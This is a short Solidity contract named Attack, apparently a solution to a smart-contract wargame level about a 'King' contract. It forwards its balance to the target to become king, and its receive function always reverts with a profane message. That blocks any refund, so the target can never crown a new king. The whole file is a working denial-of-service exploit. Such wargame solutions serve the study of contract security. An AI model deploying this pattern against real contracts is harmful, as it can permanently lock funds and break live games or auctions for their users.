pragma solidity ^0.6.0;

import "./default.sol";

contract Attack {
    address payable King;

    constructor(address payable _king) public payable {
        King = _king;
    }

    function claimKing() public {
        King.call.value(address(this).balance).gas(4000000)("");
    }

    receive() external payable {
        revert("get fucked");
    }
}
